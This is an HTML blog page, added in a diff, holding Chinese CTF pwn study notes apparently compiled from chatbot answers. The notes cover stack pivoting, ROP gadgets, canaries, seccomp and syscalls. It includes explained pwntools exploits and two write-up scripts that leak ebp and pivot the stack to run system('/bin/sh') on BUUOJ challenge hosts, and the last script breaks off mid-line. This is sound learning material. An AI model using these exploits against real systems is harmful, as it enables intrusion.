@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lyricsforward.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="溢出空间不够用无法有效构造rop链怎么办?栈劫持也可以称为栈迁移，用来解决栈本身可以利用的空间不够用，一般是—__溢出空间不够用__，没办法有效构造rop链。这个时候我们可以通过_劫持ebp_的方式，利用leave 和 ret两个汇编指令来做到栈劫持(栈迁移)。 leave 等价于 mov ebp, esp; pop ebp; ret 等价于 pop eip 请问如何劫持ebp？栈劫持也可以称为栈">
+<meta property="og:type" content="article">
+<meta property="og:title" content="lyricsforward">
+<meta property="og:url" content="https://lyricsforward.github.io/2023/05/04/writeup/index.html">
+<meta property="og:site_name" content="lyricsforward">
+<meta property="og:description" content="溢出空间不够用无法有效构造rop链怎么办?栈劫持也可以称为栈迁移，用来解决栈本身可以利用的空间不够用，一般是—__溢出空间不够用__，没办法有效构造rop链。这个时候我们可以通过_劫持ebp_的方式，利用leave 和 ret两个汇编指令来做到栈劫持(栈迁移)。 leave 等价于 mov ebp, esp; pop ebp; ret 等价于 pop eip 请问如何劫持ebp？栈劫持也可以称为栈">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-05-04T07:40:18.977Z">
+<meta property="article:modified_time" content="2023-05-04T07:28:11.393Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lyricsforward.github.io/2023/05/04/writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | lyricsforward</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lyricsforward</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://lyricsforward.github.io/2023/05/04/writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyricsforward">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-04 15:40:18 / Modified: 15:28:11" itemprop="dateCreated datePublished" datetime="2023-05-04T15:40:18+08:00">2023-05-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="溢出空间不够用无法有效构造rop链怎么办"><a href="#溢出空间不够用无法有效构造rop链怎么办" class="headerlink" title="溢出空间不够用无法有效构造rop链怎么办?"></a>溢出空间不够用无法有效构造rop链怎么办?</h3><p>栈劫持也可以称为栈迁移，用来解决栈本身可以利用的空间不够用，一般是—__溢出空间不够用__，没办法有效构造rop链。这个时候我们可以通过_劫持ebp_的方式，利用leave 和 ret两个汇编指令来做到栈劫持(栈迁移)。 leave 等价于 mov ebp, esp; pop ebp; ret 等价于 pop eip</p>
+<h3 id="请问如何劫持ebp？"><a href="#请问如何劫持ebp？" class="headerlink" title="请问如何劫持ebp？"></a>请问如何劫持ebp？</h3><p>栈劫持也可以称为栈迁移，用来解决栈本身可以利用的空间不够用，一般是溢出空间不够用，没办法有效构造rop链。这个时候我们可以通过劫持ebp的方式，利用leave 和 ret两个汇编指令来做到栈劫持(栈迁移)。 leave 等价于 mov ebp, esp; pop ebp; ret 等价于 pop eip; </p>
+<h3 id="为什么要构造rop链"><a href="#为什么要构造rop链" class="headerlink" title="为什么要构造rop链?"></a>为什么要构造rop链?</h3><p>ROP技术通俗的讲就是在控制了函数地址指针后，通过_不断地跳转到程序加载的地址空间去执行代码_的方式，想办法获得我们想要执行的函数的地址并执行，中途或许为了跳转或给寄存器赋值还需要执行一些代码片段(类似pop，ebp,retn该代码片段的地址通常被称为gadget)，最终获得一个可以交互的SHELL的技术。</p>
+<p>ROP链是一种用于绕过内存不可执行保护（NX）的技术。它是由一系列ROP gadget组成的，每个gadget都是一段汇编代码，这些代码可以完成某些特定的操作，例如将数据从内存中加载到寄存器中、将寄存器中的数据写回内存、调用某个函数等等。通过构造ROP链，攻击者可以将这些gadget按照一定的顺序连接起来，从而实现任意代码执行。</p>
+<h3 id="请问如何利用leave和ret两个汇编指令来做到栈迁移？"><a href="#请问如何利用leave和ret两个汇编指令来做到栈迁移？" class="headerlink" title="请问如何利用leave和ret两个汇编指令来做到栈迁移？"></a>请问如何利用leave和ret两个汇编指令来做到栈迁移？</h3><p>leave 等价于 mov ebp, esp; pop ebp; ret 等价于 pop eip; 这两个指令的作用是还原栈空间，其中leave指令等价于mov esp,ebp;pop ebp;，它的作用是将ebp的值赋给esp，然后将栈顶元素弹出到ebp中。这样就完成了栈空间的还原。而ret指令则是将栈顶元素弹出到eip中，从而实现函数返回。</p>
+<h3 id="怎么实现栈迁移"><a href="#怎么实现栈迁移" class="headerlink" title="怎么实现栈迁移?"></a>怎么实现栈迁移?</h3><p>栈迁移是指将栈的位置移动到攻击者控制的内存区域，从而实现任意代码执行。在栈溢出漏洞中，攻击者可以通过构造ROP链来实现栈迁移。具体来说，攻击者可以通过构造ROP链将栈指针esp指向一个攻击者控制的内存区域，然后在该内存区域中放置一些gadget，最终实现任意代码执行。</p>
+<h3 id="那么请问gadget是啥"><a href="#那么请问gadget是啥" class="headerlink" title="那么请问gadget是啥?"></a>那么请问gadget是啥?</h3><p>gadget是指一段汇编代码，它可以完成某些特定的操作，例如将数据从内存中加载到寄存器中、将寄存器中的数据写回内存、调用某个函数等等。在ROP攻击中，攻击者可以通过构造ROP链将这些gadget按照一定的顺序连接起来，从而实现任意代码执行。</p>
+<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>一、泄露ebp<br>二、找到参数s在栈上的位置<br>三、布置s栈上的值<br>四、栈劫持，获取shell</p>
+<h3 id="泄露ebp-printf函数在输出的时候遇到’-0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’-0‘，那样就会将ebp连带着输出，请为我介绍这句话的意思"><a href="#泄露ebp-printf函数在输出的时候遇到’-0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’-0‘，那样就会将ebp连带着输出，请为我介绍这句话的意思" class="headerlink" title="泄露ebp printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出，请为我介绍这句话的意思."></a>泄露ebp printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出，请为我介绍这句话的意思.</h3><p>这句话的意思是，printf函数是用来输出字符串的，字符串是由字符组成的，每个字符占一个字节。字符串的结尾必须有一个特殊的字符，叫做’\0’，也就是空字符，它的ASCII码是0。printf函数在输出字符串时，会从字符串的第一个字符开始，依次输出每个字符，直到遇到’\0’为止，然后停止输出。</p>
+<p>参数s是printf函数的一个占位符，表示要输出的字符串。如果我们将参数s全部填满，也就是说，没有留出一个字节来放’\0’，那么printf函数就不知道字符串在哪里结束了。它会继续向后读取内存中的内容，直到找到一个’\0’为止。这样就有可能将ebp连带着输出。</p>
+<p>ebp是一个寄存器的名字，它存储了当前函数的基址指针。也就是说，它指向了当前函数在栈上的起始位置。如果我们将ebp连带着输出，就相当于泄露了当前函数的栈帧信息，这可能会导致一些安全问题。</p>
+<p>找到参数s在栈上的位置 首先下个断点，来调试一下我们的ebp距离参数s的位置。</p>
+<h3 id="为什么要设置断点"><a href="#为什么要设置断点" class="headerlink" title="为什么要设置断点?"></a>为什么要设置断点?</h3><p>设置断点是为了在程序运行到某个位置时，暂停执行，方便我们观察和修改内存中的内容。 你可以使用gdb的b命令来设置断点，例如b *0x08049192，就是在地址0x08049192处设置一个断点。</p>
+<p>要找到参数s在栈上的位置，你可以在printf函数调用之前设置一个断点，然后使用gdb的x命令来查看栈中的内容，例如x&#x2F;10wx $esp，就是以十六进制格式显示栈顶开始的10个字。 你可以根据你输入的字符串来判断参数s在哪个位置，例如如果你输入了”abcd”，那么你就可以在栈中找到0x64636261这个值，它就是参数s的地址。</p>
+<p>由于我们要用到leave;ret来劫持栈，所以先找一下leva;ret的位置。</p>
+<h3 id="为什么要用leave-ret劫持栈"><a href="#为什么要用leave-ret劫持栈" class="headerlink" title="为什么要用leave ret劫持栈?"></a>为什么要用leave ret劫持栈?</h3><p>leave;ret是一种常见的汇编指令序列，它的作用是在函数返回时，恢复栈帧并跳转到返回地址。leave指令相当于执行mov esp, ebp和pop ebp两条指令，它会将ebp的值赋给esp，然后将ebp出栈。ret指令相当于执行pop eip，它会将栈顶的值赋给eip，然后跳转到eip指向的地址。</p>
+<p>如果我们能够控制ebp的值，那么我们就可以利用leave;ret来劫持栈，因为我们可以让esp指向我们想要的位置，然后将我们想要执行的地址压入栈中，从而在ret时跳转到该地址。这样就可以绕过栈溢出保护，实现任意代码执行。</p>
+<h3 id="BytesWarning-Text-is-not-bytes-assuming-ASCII-no-guarantees-什么意思"><a href="#BytesWarning-Text-is-not-bytes-assuming-ASCII-no-guarantees-什么意思" class="headerlink" title="BytesWarning: Text is not bytes; assuming ASCII, no guarantees.什么意思"></a>BytesWarning: Text is not bytes; assuming ASCII, no guarantees.什么意思</h3><p>这个警告的意思是，你在使用一个文本字符串，而不是一个字节字符串。12 文本字符串是由字符组成的，每个字符可能占用多个字节，而字节字符串是由字节组成的，每个字节只占用一个字节。3</p>
+<p>在Python中，文本字符串用str类型表示，而字节字符串用bytes类型表示。3 你可以用b前缀来创建一个字节字符串，例如b’hello’，或者用encode方法来将一个文本字符串转换为一个字节字符串，例如’hello’.encode(‘utf-8’)。3</p>
+<p>如果你在使用一个函数或者一个库，它期望接收一个字节字符串作为参数，而你传入了一个文本字符串，那么你可能会得到这个警告。24 这个警告的意思是，Python会假设你的文本字符串是用ASCII编码的，并且尝试将它转换为一个字节字符串，但是这个转换可能会失败或者不准确。24</p>
+<p>为了避免这个警告，你应该显式地指定你的文本字符串的编码方式，并且用encode方法来将它转换为一个字节字符串，例如’hello’.encode(‘utf-8’)。24</p>
+<p>这是一段用python写的代码，它使用了pwntools，一个CTF框架和漏洞利用开发库12。这段代码试图利用一个叫做not_the_same_3dsctf_2016的二进制文件，它在一个远程服务器上运行。下面是这段代码的逐行解释：</p>
+<p>from pwn import * 导入了pwntools的所有函数。<br>context.log_level&#x3D;’debug’ 设置了日志级别为debug，这意味着输出更详细。<br>p &#x3D; remote(‘node3.buuoj.cn’,29167) 创建了一个连接到远程服务器的地址和端口的对象。<br>elf &#x3D; elf(‘.&#x2F;not_the_same_3dsctf_2016’) 把二进制文件加载为一个ELF对象，这样可以访问它的符号和段。<br>write_addr &#x3D; elf.sym[‘write’] 从二进制文件的符号表中获取了write函数的地址。<br>get_flag &#x3D; 0x080489a0 设置了get_flag函数的地址，这个函数可能会打印出挑战的flag。<br>flag_bss &#x3D; 0x080eca2d 设置了二进制文件的bss段中一个可写内存位置的地址，flag会被存储在这里。<br>payload &#x3D; ‘a’*(0x2d) + p32(get_flag)+ p32(write_addr)+ ‘a’*4 +p32(1) + p32(flag_bss) + p32(45) 构造了一个有效载荷，它会溢出栈上的缓冲区，并把返回地址覆盖为get_flag。有效载荷还为write设置了一个假的栈帧，它会在get_flag返回后被调用。write的参数是：文件描述符1（标准输出），flag的地址，和长度45。<br>p.sendline(payload) 把有效载荷发送到远程服务器。<br>p.interactive() 进入交互模式，这样可以与程序的输入和输出进行交互。<br>运行这段代码的预期结果是它会打印出挑战的flag。希望这能帮助你更好地理解代码。</p>
+<h3 id="介绍一下payload怎么写的"><a href="#介绍一下payload怎么写的" class="headerlink" title="介绍一下payload怎么写的"></a><strong>介绍一下payload怎么写的</strong></h3><p>好的，我可以试着介绍一下这个有效载荷是怎么写的。有效载荷是一段用来利用缓冲区溢出漏洞的数据，它的目的是覆盖栈上的返回地址，让程序执行我们想要的代码。这个有效载荷的写法是基于以下几个步骤：</p>
+<p>首先，我们需要找到溢出点，也就是输入多少字节才能覆盖返回地址。这可以通过发送一段循环的字符序列来实现，比如用cyclic函数生成的字符串。然后我们观察程序崩溃时，返回地址被覆盖为什么值，再用cyclic_find函数找到对应的偏移量。<br>其次，我们需要找到一个合适的地址，让程序跳转到我们的有效载荷。这可以通过查看二进制文件中是否有可执行的段，比如bss段或者data段，或者使用ROP技术寻找一些有用的指令片段，比如jmp esp或者call esp。这些指令可以让程序执行栈上的代码。<br>第三，我们需要构造我们的有效载荷，也就是想要执行的代码。这可以通过使用shellcraft模块来生成一些常见的shellcode，比如弹出一个shell或者连接到一个远程服务器。也可以通过自己编写汇编代码来实现更复杂的功能。<br>最后，我们需要把以上三部分拼接起来，形成最终的有效载荷。这可以通过使用p32或者p64函数来把地址转换为字节串，然后用加号连接起来。也可以使用flat函数来自动完成这个过程。</p>
+<h3 id="32位程序，开启了canary是什么"><a href="#32位程序，开启了canary是什么" class="headerlink" title="32位程序，开启了canary是什么"></a>32位程序，开启了canary是什么</h3><p>Canary是一种栈保护机制，用于检测缓冲区溢出漏洞。当开启canary时，程序会在栈上放置一个特殊的值，如果程序检测到这个值被修改，就会认为发生了缓冲区溢出漏洞。这个机制可以防止攻击者利用缓冲区溢出漏洞来执行恶意代码。</p>
+<h3 id="prctl是什么？"><a href="#prctl是什么？" class="headerlink" title="prctl是什么？"></a>prctl是什么？</h3><p>prctl seccomp相当于内核中的一种安全机制，正常情况下，程序可以使用所有的syscall，但是当劫持程序流程之后通过exeve来呼叫syscall得到shell时seccomp边排上了用场，他可以过滤掉某些syscall，只允许使用部分syscall。</p>
+<p>prctl是一种进程管理函数，可以对进程或线程做一些设置，比如限制系统调用、设置沙箱模式、设置进程名等。</p>
+<p>prctl函数有五个参数，第一个参数是要执行的操作，后面的参数是根据第一个参数的不同而有不同的含义。¹²</p>
+<p>prctl函数可以执行很多操作，比如：</p>
+<ul>
+<li>PR_GET_PDEATHSIG：获取进程在父进程死亡时收到的信号。</li>
+<li>PR_SET_PDEATHSIG：设置进程在父进程死亡时收到的信号。</li>
+<li>PR_GET_DUMPABLE：获取进程是否可以被dump的标志。</li>
+<li>PR_SET_DUMPABLE：设置进程是否可以被dump的标志。</li>
+<li>PR_GET_NAME：获取进程的名字。</li>
+<li>PR_SET_NAME：设置进程的名字。</li>
+<li>PR_GET_TIMING：获取进程的计时模式。</li>
+<li>PR_SET_TIMING：设置进程的计时模式。</li>
+<li>PR_SET_SECCOMP：设置进程的沙箱模式和过滤规则。</li>
+<li>PR_GET_SECCOMP：获取进程的沙箱模式。</li>
+</ul>
+<p>prctl函数还可以执行一些其他操作，具体可以参考&lt;linux&#x2F;prctl.h&gt;头文件或者man手册。</p>
+<h3 id="本题系统内核只允许使用sys-open，sys-read，sys-write-系统内核的调用就是利用int-0x80-去调用函数的这种过程什么意思"><a href="#本题系统内核只允许使用sys-open，sys-read，sys-write-系统内核的调用就是利用int-0x80-去调用函数的这种过程什么意思" class="headerlink" title="本题系统内核只允许使用sys_open，sys_read，sys_write 系统内核的调用就是利用int 0x80 去调用函数的这种过程什么意思"></a>本题系统内核只允许使用sys_open，sys_read，sys_write 系统内核的调用就是利用int 0x80 去调用函数的这种过程什么意思</h3><p>int 0x80是一种汇编语言指令，用于在Linux系统中调用内核提供的服务，也就是系统调用。12</p>
+<p>当一个程序执行int 0x80指令时，会发生以下步骤：</p>
+<p>程序将系统调用的编号和参数放在特定的寄存器中，比如eax寄存器存放系统调用编号，ebx, ecx, edx, esi, edi, ebp寄存器存放系统调用参数。<br>程序触发一个中断，将控制流转移到内核中的中断向量表的第0x80项，也就是系统调用入口点。<br>内核保存用户空间的寄存器值到内核栈中，然后执行系统调用分发器，根据eax寄存器的值找到对应的系统调用函数，并传入相应的参数。<br>内核执行完系统调用函数后，将返回值放在eax寄存器中，然后恢复用户空间的寄存器值，并返回到用户空间的下一条指令。</p>
+<h3 id="为什么要用int-0x80来调用系统调用？"><a href="#为什么要用int-0x80来调用系统调用？" class="headerlink" title="为什么要用int 0x80来调用系统调用？"></a>为什么要用int 0x80来调用系统调用？</h3><p>使用int 0x80来调用系统调用的原因是，这是一种触发中断的指令，可以将控制流转移到内核中的中断向量表的第0x80项，也就是系统调用入口点。</p>
+<p>这样，程序可以通过设置寄存器的值来告诉内核要执行哪个系统调用和传递哪些参数，而不需要直接访问内核空间或者使用其他复杂的机制。</p>
+<p>不过，使用int 0x80来调用系统调用已经是一种过时的方式，因为它有一些缺点，比如：</p>
+<p>它需要切换到内核模式，保存和恢复寄存器，这些都会消耗时间和资源。<br>它不能很好地支持64位系统或者多核处理器。<br>它不能很好地利用CPU的一些特性，比如分支预测或者指令缓存。<br>因此，现代的Linux系统一般使用syscall或者sysenter这样的专门的指令来调用系统调用，它们比int 0x80更快更高效。</p>
+<h3 id="和syscall有什么区别"><a href="#和syscall有什么区别" class="headerlink" title="和syscall有什么区别"></a>和syscall有什么区别</h3><p>int 0x80和syscall的区别是，syscall是一种专门用于调用系统调用的指令，它比int 0x80更快更高效。</p>
+<p>int 0x80是一种触发中断的指令，它会导致CPU切换到内核模式，保存和恢复寄存器，这些都会消耗时间和资源。</p>
+<p>syscall是一种不触发中断的指令，它会直接跳转到内核中的系统调用入口点，而不需要保存和恢复寄存器。</p>
+<p>因此，现代的Linux系统一般使用syscall来调用系统调用，而不使用int 0x80。</p>
+<h3 id="在文件读写之前，我们必须先打开文件。从应用程序的角度来看，这是通过标准-库的open函数完成的，该函数返回一个文件描述符。内核中是由系统调用sys-open-函数完成。-什么意思啊"><a href="#在文件读写之前，我们必须先打开文件。从应用程序的角度来看，这是通过标准-库的open函数完成的，该函数返回一个文件描述符。内核中是由系统调用sys-open-函数完成。-什么意思啊" class="headerlink" title="在文件读写之前，我们必须先打开文件。从应用程序的角度来看，这是通过标准 库的open函数完成的，该函数返回一个文件描述符。内核中是由系统调用sys_open()函数完成。 什么意思啊"></a>在文件读写之前，我们必须先打开文件。从应用程序的角度来看，这是通过标准 库的open函数完成的，该函数返回一个文件描述符。内核中是由系统调用sys_open()函数完成。 什么意思啊</h3><p>这段话的意思是，当我们要对一个文件进行读写操作时，我们必须先打开这个文件，让内核知道我们要访问这个文件。在应用程序中，我们可以使用标准库的open函数来打开一个文件，这个函数会返回一个文件描述符，它是一个整数，用来标识这个文件。但是，open函数并不是直接打开文件的，它只是调用了内核中的一个服务，也就是系统调用。系统调用是一种让应用程序请求内核提供服务的机制，比如打开文件、读写数据、分配内存等。内核中有很多系统调用，每个系统调用都有一个编号和名称。打开文件的系统调用的编号是5，名称是sys_open()。当应用程序调用open函数时，它实际上是通过一些指令来触发一个系统调用，并把系统调用的编号和参数传递给内核。内核收到系统调用请求后，就会执行对应的函数，也就是sys_open()。这个函数会在内核空间中处理文件打开的逻辑，并返回一个文件描述符给应用程序。所以，应用程序看到的open函数和内核看到的sys_open()函数是不同的层次的东西，它们之间有一个系统调用的桥梁。</p>
+<h3 id="这个Python脚本是用来利用一个名为orw的二进制文件的漏洞的。它使用了一个叫做pwntools的库，这个库是一个CTF框架和漏洞开发库，它可以帮助我们快速地编写和运行漏洞利用代码。这个脚本的每一行的意思是："><a href="#这个Python脚本是用来利用一个名为orw的二进制文件的漏洞的。它使用了一个叫做pwntools的库，这个库是一个CTF框架和漏洞开发库，它可以帮助我们快速地编写和运行漏洞利用代码。这个脚本的每一行的意思是：" class="headerlink" title="这个Python脚本是用来利用一个名为orw的二进制文件的漏洞的。它使用了一个叫做pwntools的库，这个库是一个CTF框架和漏洞开发库，它可以帮助我们快速地编写和运行漏洞利用代码。这个脚本的每一行的意思是："></a>这个Python脚本是用来利用一个名为orw的二进制文件的漏洞的。它使用了一个叫做pwntools的库，这个库是一个CTF框架和漏洞开发库，它可以帮助我们快速地编写和运行漏洞利用代码。这个脚本的每一行的意思是：</h3><ul>
+<li>from pwn import *：这一行是导入pwntools库中的所有功能，比如连接目标、发送和接收数据、生成和执行shellcode等。</li>
+<li>r &#x3D; remote(‘node3.buuoj.cn’,29475)：这一行是创建一个远程连接，连接到node3.buuoj.cn这个主机的29475端口，这个主机上运行着orw这个二进制文件。r是一个pwnlib.tubes.remote对象，我们可以通过它和目标交互。</li>
+<li>context.log_level &#x3D; ‘debug’：这一行是设置pwntools的日志级别为debug，这样我们可以看到更多的调试信息，比如发送和接收的数据、系统调用等。</li>
+<li>elf &#x3D; ELF(‘orw’)：这一行是创建一个pwnlib.elf.elf对象，它可以解析orw这个二进制文件的ELF格式，获取一些有用的信息，比如入口点、符号表、重定位表等。</li>
+<li>shellcode &#x3D; shellcraft.open(‘&#x2F;flag’)：这一行是使用pwnlib.shellcraft模块来生成一段shellcode，这段shellcode的功能是打开&#x2F;flag这个文件。shellcraft.open(‘&#x2F;flag’)会返回一个字符串，它是一段汇编代码，用来调用open系统调用。</li>
+<li>shellcode +&#x3D; shellcraft.read(‘eax’,’esp’,100)：这一行是在shellcode后面追加一段shellcode，这段shellcode的功能是读取&#x2F;flag文件的内容。shellcraft.read(‘eax’,’esp’,100’)会返回一个字符串，它是一段汇编代码，用来调用read系统调用。’eax’表示要读取的文件描述符，它是open系统调用返回的值；’esp’表示要存放读取内容的缓冲区地址，它是栈指针寄存器；100表示要读取的字节数。</li>
+<li>shellcode +&#x3D; shellcraft.write(1,’esp’,100)：这一行是在shellcode后面追加一段shellcode，这段shellcode的功能是将&#x2F;flag文件的内容写入标准输出。shellcraft.write(1,’esp’,100)会返回一个字符串，它是一段汇编代码，用来调用write系统调用。1表示要写入的文件描述符，它是标准输出；’esp’表示要写入内容的缓冲区地址，它和read系统调用使用的相同；100表示要写入的字节数。</li>
+<li>shellcode &#x3D; asm(shellcode)：这一行是使用pwnlib.asm模块来将shellcode字符串转换为二进制数据，也就是可执行的机器码。asm(shellcode)会返回一个字节串对象。</li>
+<li>r.sendline(shellcode)：这一行是将shellcode发送给目标主机，也就是向orw程序输入数据。r.sendline(shellcode)会在shellcode后面添加一个换行符，并发送给r对象代表的远程连接。</li>
+<li>r.interactive()：这一行是让我们和目标主机交互，也就是看到orw程序的输出，并向它输入数据。r.interactive()会启动一个交互式终端，并将r对象代表的远程连接绑定到标准输入和输出上。</li>
+</ul>
+<p>总之，这个脚本的目的是生成并发送一段shellcode给orw程序，让它执行并打印出&#x2F;flag文件的内容。</p>
+<h3 id="wp1"><a href="#wp1" class="headerlink" title="wp1"></a>wp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28967</span>)</span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line">payload2=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="wp2"><a href="#wp2" class="headerlink" title="wp2"></a>wp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25230</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">sys_plt=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x8048562</span></span><br><span class="line"></span><br><span class="line">py=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,py)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_plt)+p32(<span class="number">0</span>)+p32(ebp-<span class="number">0x28</span>)+<span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload=payload.ljust(<span 